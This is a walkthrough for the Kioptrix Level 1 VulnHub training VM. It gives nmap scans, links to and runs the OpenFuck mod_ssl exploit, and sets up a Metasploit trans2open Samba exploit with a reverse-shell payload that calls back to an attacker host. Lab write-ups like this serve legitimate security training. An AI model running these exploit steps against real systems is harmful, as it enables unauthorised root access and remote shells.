# writeup kioptrix level 1
  This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
  
# Download vm-machine from vulnhub website:
link: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ .

# Solution:
  [+] At the beginning, we need to perform ping sweep to discover network devices that alive. <br>
    command: 
    <code>sudo nmap -sn 192.168.1.0/24 </code> <br><br>
   <img src="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/pics/ping_sweep.png"/>
   <br><br>
   
  [+] After finding target IP, we need to perform port scan and banner grabbing over TCP through nmap. <br>
    command: <code>sudo nmap -sS -sV -O 192.168.1.104 -p-</code> <br><br>
    <img src="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/pics/nmap_portscan_banner_grabbing.png"/>
    <br><br>
    
  [+] Now, we can performing vulnerability assessment through doing search about vulnerabilities that can be found according to protocols versions.  <br>
    that depend on your search skill :D. <br>
    i found some vulneravilities:- <br>
    -- [1] buffer-over Apache mod_ssl < 2.8.7 OpenSSL <br>
    -- [1] download openfuck script from: 
     <a href="https://www.exploit-db.com/exploits/764/">exploit</a> <br>
     -- [1] or here: <a href="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/additional_content/openfuck.c"> Github </a> <br>
     -- [1] or modified script: <a href="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/additional_content/openfuck_modified.c ">Modifeid script:Github</a><br>
     -- [1] you can download the exploit script to using it.<br>
     -- [1] command: <code>./OpenFuck 0x6b 192.168.1.106</code> <br>
     <pre>
     -- [1] note: if any problem occur during running of the script, you will find some solution here. <br>
     -- [1] link: <a href="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/additional_content/install_openfuck.md "> follow this instructions</a> <br>
     </pre>
      -- [1] POC: <br>
     <img src="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/pics/overflow.png"/>
    <br><br>
      -- [2] samba: <br>
      -- [2] enumeration commands: <br>
          <code> enum4linux 192.168.1.104 </code> <br>
      -- [2] detected samba version: <br>
          <code> msfconsole </code> <br>
          <code> msf > search smb_version </code> <br>
          <code> msf > use auxiliary/scanner/smb/smb_version </code> <br>
          <code> msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.104 </code> <br>
          <code> msf auxiliary(scanner/smb/smb_version) > exploit  </code> <br>
          <img src="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/pics/samba_version.png"/>
      -- [2] samba 2.2.1a is vulnerable <br>
          command:
            <code> msf > search samba  </code> <br>
            <code> msf > use exploit/linux/samba/trans2open  </code> <br>
            <code> msf exploit(linux/samba/trans2open) > set RHOST 192.168.1.104 </code> <br>
            <code> msf exploit(linux/samba/trans2open) > set RPORT 139 </code> <br>
            <code> msf exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp </code> <br>
            <code> msf exploit(linux/samba/trans2open) > set LHOST 192.168.1.105 </code> <br>
            <code> msf exploit(linux/samba/trans2open) > set LPORT 4444 </code> <br>
            <code> msf exploit(linux/samba/trans2open) > exploit </code> <br>
      -- [2] POC:
            <img src="https://github.com/BassamMaged/vulnhub_write-ups/blob/master/kioptrix_level_1/pics/samba_overflow.png"/>
      <pre>we are do the best to keep it up-to-date and adding more vulnerabilities if we found it at this machine.
      Best wishes,,</pre>
